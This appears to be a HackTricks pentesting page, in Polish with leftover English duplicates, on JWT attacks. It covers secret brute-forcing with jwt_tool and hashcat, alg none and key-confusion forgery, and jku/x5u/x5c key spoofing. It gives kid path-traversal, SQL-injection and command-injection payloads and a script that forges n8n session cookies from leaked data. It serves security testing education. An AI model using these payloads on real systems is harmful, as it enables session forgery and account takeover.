# Luki JWT (Json Web Tokens)

{{#include ../banners/hacktricks-training.md}}

**Część tego wpisu opiera się na świetnym poście:** [**https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\
**Autor świetnego narzędzia do pentest JWTs** [**https://github.com/ticarpi/jwt_tool**](https://github.com/ticarpi/jwt_tool)

### **Szybkie zwycięstwa**

Uruchom [**jwt_tool**](https://github.com/ticarpi/jwt_tool) w trybie `All Tests!` i poczekaj na zielone linie
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Jeśli masz szczęście, narzędzie znajdzie jakiś przypadek, w którym aplikacja webowa nieprawidłowo sprawdza JWT:

![](<../images/image (935).png>)

Następnie możesz wyszukać request w swoim proxy lub dump użytego JWT dla tego requestu przy użyciu jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

### Praktyczny proces oceny JWT

- **Scope the session control**: Wybierz żądanie specyficzne dla użytkownika (np. profile, billing). Usuwaj cookies/headers pojedynczo, aż żądanie zostanie odrzucone, aby wyizolować który(a) token(y) faktycznie kontrolują autoryzację.
- **Locate JWTs in traffic**: Często znajdują się w `Authorization: Bearer <JWT>`, ale pojawiają się też w custom headers lub cookies. Jeśli Burp ich nie podświetla, użyj Target → Site map → Engagement tools → Search z regexami takimi jak:
- `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
- `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`
- **Decode and enumerate**: Użyj Burp **JWT Editor** lub `python3 jwt_tool.py <JWT>` aby odczytać header/payload. Zwróć uwagę na `alg`, `exp`/czas życia tokena oraz claims kierujące authn/authz (`role`, `id`, `username`, `email` itd.).
- **Signature enforcement sanity check**: Zmień lub usuń kilka bajtów w części signature i odtwórz żądanie. Akceptacja oznacza brak weryfikacji signature i pozwala na bezpośrednie modyfikowanie payload claims.
- **Goal**: Zmodyfikuj payload claims, aby eskalować uprawnienia; każdy z poniższych ataków ma na celu zmusić serwer do zaakceptowania zmanipulowanego payload przez wykorzystanie słabej weryfikacji, słabych sekretów lub niebezpiecznego wyboru klucza.

### Manipulacja danymi bez zmiany podpisu

Możesz po prostu manipulować danymi pozostawiając signature bez zmian i sprawdzić, czy serwer weryfikuje signature. Spróbuj np. zmienić username na "admin".

#### **Czy token jest weryfikowany?**

- Komunikat o błędzie sugeruje, że weryfikacja jest wykonywana; warto przejrzeć szczegółowe informacje z błędów, jeśli są ujawniane.
- Zmiana w zwróconej stronie także wskazuje na weryfikację.
- Brak zmian sugeruje brak weryfikacji; to moment na eksperymenty z modyfikacją payload claims.

### Pochodzenie

Ważne jest ustalenie, czy token został wygenerowany po stronie serwera czy po stronie klienta, analizując historię żądań w proxy.

- Tokeny widziane najpierw po stronie klienta sugerują, że klucz może być ujawniony w kodzie klienta, co wymaga dalszego dochodzenia.
- Tokeny pochodzące od strony serwera wskazują na bardziej bezpieczny proces.

### Czas trwania

Sprawdź, czy token jest ważny dłużej niż 24h — być może nigdy nie wygasa. Jeśli istnieje pole `exp`, sprawdź, czy serwer poprawnie je obsługuje.

### Brute-force HMAC secret

[**See this page.**](../generic-hacking/brute-force.md#jwt)

If the header uses **HS256**, dump the token to a file and try offline cracking:
```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```
Gdy sekret zostanie odzyskany, załaduj go jako klucz symetryczny w Burp JWT Editor i ponownie podpisz zmodyfikowane claims.

### Wyprowadź sekrety JWT z leaked config + DB data

Jeśli dowolne odczytanie pliku (lub backup leak) ujawnia zarówno **materiały szyfrowania aplikacji**, jak i **rekordy użytkowników**, czasami można odtworzyć sekret podpisujący JWT i sfałszować session cookies bez znajomości żadnych haseł w postaci jawnej. Przykładowy wzorzec zaobserwowany w stosach automatyzacji workflow:

1. Leak klucz aplikacji (np. `encryptionKey`) z pliku konfiguracyjnego.
2. Leak tabelę użytkowników, aby uzyskać `email`, `password_hash` i `user_id`.
3. Wyprowadź sekret podpisujący z klucza, a następnie wyprowadź hash dla każdego użytkownika oczekiwany w payload JWT:
```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()              # signing key
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```
4. Umieść podpisany token w ciasteczku sesji (np. `n8n-auth`), aby podszyć się pod konto użytkownika/admina, nawet jeśli hash hasła jest zasolony.

### Modify the algorithm to None

Ustaw używany algorytm na "None" i usuń część podpisu.

Użyj rozszerzenia Burp o nazwie "JSON Web Token", aby wypróbować tę podatność i zmienić różne wartości wewnątrz JWT (wyślij żądanie do Repeater i na karcie "JSON Web Token" możesz zmodyfikować wartości tokena. Możesz też wybrać ustawienie pola "Alg" na "None").

### Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)

Algorytm HS256 używa tajnego klucza do podpisywania i weryfikacji każdej wiadomości.\
Algorytm RS256 używa klucza prywatnego do podpisania wiadomości i klucza publicznego do uwierzytelniania.

Jeśli zmienisz algorytm z RS256 na HS256, kod po stronie backendu użyje klucza publicznego jako tajnego klucza, a następnie użyje algorytmu HS256 do weryfikacji podpisu.

Następnie, używając klucza publicznego i zmieniając RS256 na HS256, możemy stworzyć prawidłowy podpis. Możesz pobrać certyfikat serwera WWW wykonując to:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
Using Burp **JWT Editor**, zaimportuj klucz publiczny RSA (z `/.well-known/jwks.json` lub PEM) i uruchom **Attack → HMAC Key Confusion Attack**, aby zautomatyzować próbę ponownego podpisania HS256.

### New public key inside the header

Atakujący osadza nowy klucz w nagłówku tokena, a serwer używa tego klucza do weryfikacji podpisu (CVE-2018-0114).

Można to zrobić za pomocą rozszerzenia "JSON Web Tokens" dla Burp.\
(Wyślij żądanie do Repeater, w zakładce JSON Web Token wybierz "CVE-2018-0114" i wyślij żądanie).

### JWKS Spoofing

Instrukcja opisuje metodę oceny bezpieczeństwa tokenów JWT, szczególnie tych używających nagłówka "jku". Ten atrybut powinien wskazywać na plik JWKS (JSON Web Key Set), który zawiera klucz publiczny potrzebny do weryfikacji tokena.

- **Assessing Tokens with "jku" Header**:
- Zweryfikuj URL w atrybucie "jku", aby upewnić się, że prowadzi do odpowiedniego pliku JWKS.
- Zmień wartość "jku" w tokenie, aby wskazywała na kontrolowaną usługę webową, co pozwoli na obserwację ruchu.
- **Monitoring for HTTP Interaction**:
- Zaobserwowanie żądań HTTP do wskazanego URL oznacza, że serwer próbuje pobrać klucze z twojego linku.
- Korzystając z `jwt_tool` do tego procesu, ważne jest zaktualizowanie pliku `jwtconf.ini` o lokalizację twojego JWKS, aby ułatwić testowanie.
- **Command for `jwt_tool`**:

- Wykonaj następujące polecenie, aby zasymulować scenariusz za pomocą `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Kid Issues Overview

Opcjonalny atrybut nagłówka znany jako `kid` jest używany do identyfikacji konkretnego klucza, co jest szczególnie ważne w środowiskach, gdzie istnieje wiele kluczy do weryfikacji podpisu tokena. Ten atrybut pomaga w wyborze odpowiedniego klucza do weryfikacji podpisu tokena.

#### Revealing Key through "kid"

Gdy w nagłówku występuje atrybut `kid`, warto przeszukać katalog webowy pod kątem odpowiadającego pliku lub jego wariantów. Na przykład, jeśli określono `"kid":"key/12345"`, należy szukać plików _/key/12345_ i _/key/12345.pem_ w katalogu głównym serwera WWW.

#### Path Traversal with "kid"

Atrybut `kid` może być również wykorzystany do nawigacji po systemie plików, potencjalnie umożliwiając wybór dowolnego pliku. Możliwe jest testowanie łączności lub przeprowadzanie ataków Server-Side Request Forgery (SSRF) poprzez zmianę wartości `kid`, aby celować w konkretne pliki lub usługi. Modyfikacja JWT w celu zmiany wartości `kid`, przy zachowaniu oryginalnego podpisu, może być osiągnięta przy użyciu flagi `-T` w jwt_tool, jak pokazano poniżej:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.

Atakując pliki o przewidywalnej zawartości, można sfałszować poprawny JWT. Na przykład plik `/proc/sys/kernel/randomize_va_space` w systemach Linux, znany z zawierania wartości **2**, może być użyty w parametrze `kid` z **2** jako symetrycznym hasłem do wygenerowania tokena JWT.

A practical pattern for brittle file-system key loading is to generate an HS256 key with JWK `k` set to `AA==`, set `kid` to a traversal like `../../../../../../../dev/null`, and re-sign—some implementations treat the empty file as a valid HMAC secret and will accept forged tokens.

Praktyczny wzorzec dla kruchych mechanizmów ładowania kluczy z systemu plików polega na wygenerowaniu klucza HS256 z JWK `k` ustawionym na `AA==`, ustawieniu `kid` na ścieżkę typu `../../../../../../../dev/null` i ponownym podpisaniu — niektóre implementacje traktują pusty plik jako prawidłowy sekret HMAC i zaakceptują sfałszowane tokeny.

#### SQL Injection via "kid"

Jeśli zawartość roszczenia `kid` jest używana do pobrania hasła z bazy danych, modyfikacja ładunku `kid` może ułatwić przeprowadzenie SQL Injection. Przykładowy ładunek wykorzystujący SQL injection do zmiany procesu podpisywania JWT to:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ta zmiana wymusza użycie znanego sekretu, `ATTACKER`, do podpisywania JWT.

#### OS Injection through "kid"

Sytuacja, w której parametr `kid` wskazuje ścieżkę do pliku używaną w kontekście wykonywania poleceń, może prowadzić do podatności Remote Code Execution (RCE). Wstrzykując polecenia do parametru `kid`, można ujawnić prywatne klucze. Przykładowy ładunek umożliwiający RCE i ujawnienie kluczy to:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\\
If the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

jku oznacza **JWK Set URL**.\\
Jeśli token używa roszczenia “**jku**” w **Header**, to **sprawdź podany URL**. Powinien on wskazywać na adres zawierający plik JWKS z kluczem Public Key służącym do weryfikacji tokena. Sfałszuj token tak, aby wartość jku wskazywała na usługę sieciową, którą możesz monitorować pod kątem ruchu.

First you need to create a new certificate with new private & public keys

Najpierw musisz utworzyć nowy certyfikat z nowymi kluczem prywatnym i publicznym.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Następnie możesz użyć na przykład [**jwt.io**](https://jwt.io) aby utworzyć nowe JWT z **utworzonymi public and private keys oraz wskazując parametr jku na utworzony certyfikat.** Aby utworzyć prawidłowy certyfikat jku możesz pobrać oryginalny i zmienić potrzebne parametry.

Możesz uzyskać parametry "e" i "n" z publicznego certyfikatu używając:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
Jeżeli weryfikator pobiera materiał klucza zdalnie, umieść Burp Collaborator URL w `jku`/`x5u` używając **JWT Editor → Attack → Embed Collaborator payload**. Każde wywołanie zwrotne potwierdza pobranie kluczy w stylu SSRF; następnie umieść własny JWKS/PEM pod tym URL i ponownie podpisz token swoim kluczem prywatnym, tak aby serwis zaakceptował tokeny wygenerowane przez atakującego.

#### x5u

X.509 URL. URI wskazujący na zestaw certyfikatów publicznych X.509 (standard formatu certyfikatu) zakodowanych w formacie PEM. Pierwszy certyfikat w zestawie musi być tym, którym podpisano ten JWT. Każdy kolejny certyfikat podpisuje poprzedni, tworząc w ten sposób łańcuch certyfikatów. X.509 jest zdefiniowany w RFC 52807. Do transferu certyfikatów wymagane jest zabezpieczenie transportu.

Spróbuj **zmienić ten nagłówek na URL pod Twoją kontrolą** i sprawdź, czy otrzymasz jakieś żądanie. W takim przypadku **możesz manipulować JWT**.

Aby sfałszować nowy token używając certyfikatu kontrolowanego przez Ciebie, musisz utworzyć certyfikat i wyodrębnić klucz publiczny i prywatny:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Następnie możesz na przykład użyć [**jwt.io**](https://jwt.io) do stworzenia nowego JWT z **utworzonym kluczem publicznym i prywatnym oraz wskazaniem parametru x5u na utworzony certificate .crt.**

![](<../images/image (956).png>)

Możesz też wykorzystać obie te vulns **dla SSRFs**.

#### x5c

Ten parametr może zawierać **certificate w base64**:

![](<../images/image (1119).png>)

Jeśli atakujący wygeneruje self-signed certificate i utworzy forged token przy użyciu odpowiadającego klucza prywatnego, a następnie zastąpi wartość parametru "x5c" nowo wygenerowanym certificate i zmodyfikuje inne parametry, mianowicie n, e oraz x5t, to w praktyce forged token zostanie zaakceptowany przez serwer.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Wbudowany klucz publiczny (CVE-2018-0114)

Jeśli JWT zawiera osadzony klucz publiczny, jak w poniższym scenariuszu:

![](<../images/image (624).png>)

Używając następującego skryptu nodejs można wygenerować klucz publiczny z tych danych:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Można wygenerować nowy private/public key, osadzić nowy public key wewnątrz tokena i użyć go do wygenerowania nowego signature:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Możesz uzyskać "n" i "e" używając tego skryptu nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Na koniec, korzystając z klucza publicznego i prywatnego oraz nowych wartości "n" i "e", możesz użyć [jwt.io](https://jwt.io) do sfałszowania nowego poprawnego JWT z dowolnymi informacjami.

### ES256: Odkrycie klucza prywatnego przy użyciu tego samego nonce

Jeśli niektóre aplikacje używają ES256 i stosują ten sam nonce do wygenerowania dwóch JWT, klucz prywatny może zostać odtworzony.

Here is a example: [ECDSA: Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

JTI (JWT ID) claim zapewnia unikalny identyfikator dla tokenu JWT. Może być użyty, aby zapobiec replayowi tokenu.\
Wyobraź sobie jednak sytuację, w której maksymalna długość ID wynosi 4 (0001-9999). Żądania 0001 i 10001 będą używać tego samego ID. Jeśli backend inkrementuje ID przy każdym żądaniu, możesz to wykorzystać do **replay a request** (konieczne będzie wysłanie 10000 żądań między kolejnymi udanymi replayami).

### Zarejestrowane claims JWT


{{#ref}}
https://www.iana.org/assignments/jwt/jwt.xhtml#claims
{{#endref}}

### Inne ataki

**Cross-service Relay Attacks**

Zaobserwowano, że niektóre aplikacje webowe polegają na zaufanej JWT service do generowania i zarządzania swoimi tokenami. Zarejestrowano przypadki, w których token wygenerowany dla jednego klienta przez JWT service był akceptowany przez innego klienta tej samej usługi. Jeśli zaobserwujesz wystawienie lub odnowienie JWT przez usługę third-party, należy sprawdzić możliwość zarejestrowania konta w innym kliencie tej usługi używając tej samej nazwy użytkownika/email. Następnie należy spróbować replay the obtained token w żądaniu do celu, aby sprawdzić, czy zostanie on zaakceptowany.

- Akceptacja twojego tokenu może wskazywać na krytyczny problem, potencjalnie pozwalając na spoofing konta dowolnego użytkownika. Należy jednak pamiętać, że może być wymagane zezwolenie na szersze testy, jeśli rejestrujesz się w aplikacji third-party, ponieważ może to wejść w prawne grey area.

**Expiry Check of Tokens**

Wygaśnięcie tokenu jest sprawdzane przy użyciu "exp" Payload claim. Ponieważ JWT są często używane bez informacji o sesji, wymagane jest ostrożne postępowanie. W wielu przypadkach przechwycenie i replaying another user's JWT może umożliwić podszycie się pod tego użytkownika. JWT RFC zaleca łagodzenie JWT replay attacks poprzez wykorzystanie "exp" claim do ustawienia czasu wygaśnięcia tokenu. Ponadto kluczowe jest wdrożenie odpowiednich kontroli po stronie aplikacji, aby przetwarzała tę wartość i odrzucała wygasłe tokeny. Jeśli token zawiera "exp" claim i limity czasu testów na to pozwalają, zaleca się zapisanie tokenu i jego replay po upływie czasu wygaśnięcia. Zawartość tokenu, włącznie z parsowaniem timestampów i sprawdzaniem wygaśnięcia (timestamp w UTC), można odczytać za pomocą flagi -R w jwt_tool.

- Może istnieć ryzyko bezpieczeństwa, jeśli aplikacja wciąż waliduje token po jego wygaśnięciu, ponieważ może to oznaczać, że token nigdy nie wygaśnie.

### Narzędzia

- [jwt_tool](https://github.com/ticarpi/jwt_tool) – decoding, claim/header tampering, offline secret cracking (`-C`) oraz semi-automated attack modes (`-M at`).
- [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) – decode/re-sign in Repeater, generate custom keys, and run built-in attacks (**none**, **HMAC key confusion**, **embedded JWK**, **jku/x5u collaborator payloads**).
- [hashcat](https://hashcat.net/hashcat/) `-m 16500` – GPU-accelerated HS256 secret cracking after exporting JWTs to a wordlist.


{{#ref}}
https://github.com/ticarpi/jwt_tool
{{#endref}}

## Referencje

- [n8n token forge chain – config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
- [Burp Suite – JWT Editor extension](https://github.com/PortSwigger/jwt-editor)
- [jwt_tool attack methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [Keys to JWT Assessments – TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)

{{#include ../banners/hacktricks-training.md}}
